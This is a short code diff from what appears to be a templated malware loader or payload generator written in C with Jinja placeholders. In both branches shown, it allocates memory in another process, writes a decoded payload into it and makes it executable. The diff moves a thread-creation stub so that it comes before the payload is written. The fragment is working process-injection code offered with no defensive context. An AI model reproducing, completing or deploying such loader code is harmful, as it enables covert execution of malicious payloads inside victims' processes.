@@ -15,10 +15,10 @@
             LPVOID pRemoteCode = pVirtualAllocEx(
                 hProc, NULL, length, MEM_COMMIT, PAGE_READWRITE
             );
+            {{ createThreadStub("mem", "pRemoteCode") }}
             pWriteProcessMemory(
                 hProc, pRemoteCode, (PVOID) decoded, length, (SIZE_T*) NULL
             );
-            {{ createThreadStub("remote", "pRemoteCode", "pRemoteCode") }}
             DWORD old;
             pVirtualProtectEx(
                 hProc, pRemoteCode, length, PAGE_EXECUTE_READ, &old
@@ -27,10 +27,10 @@
             LPVOID pRemoteCode = pVirtualAllocEx(
                 hProc, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE
             );
+            {{ createThreadStub("mem", "pRemoteCode") }}
             pWriteProcessMemory(
                 hProc, pRemoteCode, (PVOID) decoded, length, (SIZE_T*) NULL
             );
-            {{ createThreadStub("remote", "pRemoteCode", "pRemoteCode") }}
         {% endif %}
         return pRemoteCode;
     }
